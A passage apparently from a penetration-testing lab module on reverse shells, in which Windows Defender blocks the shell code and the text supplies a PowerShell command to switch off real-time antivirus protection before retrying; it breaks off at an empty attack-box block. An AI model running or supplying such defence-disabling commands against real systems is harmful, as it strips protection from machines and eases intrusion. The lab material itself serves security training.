The `Windows Defender antivirus` (`AV`) software stopped the execution of the code. This is working exactly as intended, and from a `defensive` perspective, this is a `win`. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):

#### Disable AV

Reverse Shells

```powershell-session
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Once AV is disabled, attempt to execute the code again.

#### Server (attack box)

```shell-session
